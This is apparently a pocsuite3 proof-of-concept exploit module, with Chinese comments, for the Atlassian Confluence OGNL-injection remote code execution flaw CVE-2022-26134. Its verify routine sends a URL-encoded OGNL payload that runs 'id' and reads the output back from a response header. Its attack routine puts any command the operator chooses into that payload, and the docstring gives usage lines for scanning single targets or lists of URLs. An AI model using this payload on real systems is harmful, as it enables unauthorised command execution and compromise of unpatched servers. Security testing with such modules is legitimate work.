from collections import OrderedDict
from urllib.parse import urljoin
import re,random
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['luckying']  #  PoC作者的大名
    vulDate = '2022-06-07'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-06-07'  # 编写 PoC 的日期
    updateDate = '2022-06-07'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = 'Atlassian Confluence 远程代码执行(CVE-2022-26134)'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'Atlassian Confluence'  # 漏洞应用名称
    appVersion = '''Confluence Server and Data Center >= 1.3.0
Confluence Server and Data Center < 7.4.17
Confluence Server and Data Center < 7.13.7
Confluence Server and Data Center < 7.14.3
Confluence Server and Data Center < 7.15.2
Confluence Server and Data Center < 7.16.4
Confluence Server and Data Center < 7.17.4
Confluence Server and Data Center < 7.18.1'''  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Atlassian Confluence 远程代码执行(CVE-2022-26134)
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    利用:pocsuite -r .\poc++.py -u url(-f url.txt) --attack --cmd 'whoami'
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString(default='whoami',description='输入命令',require=False)
        return o
    def _verify(self):
        result = {}
        headers={
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        path = "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
        url = self.url + path
        try:
            resq = requests.get(url=url,headers=headers,allow_redirects=False,timeout=5)
            if resq and resq.status_code == 302 and 'uid=' in resq.headers['X-Cmd-Response']  :
                result['VerifyInfo'] = {}
                result['VerifyInfo']['poc'] = url
                result['VerifyInfo']['return_result'] = resq.headers['X-Cmd-Response']     
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        result = {}
        cmd = self.get_option("cmd")
        headers={
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        path = "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(cmd)
        url = self.url + path
        try:
            resq = requests.get(url=url,headers=headers,allow_redirects=False,timeout=5)
            if resq and resq.status_code == 302:
                print('output >>> \n'+resq.headers['X-Cmd-Response'])
                result['VerifyInfo'] = {}
                result['VerifyInfo']['poc'] = url   
        except Exception as e:
            return

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(POC)
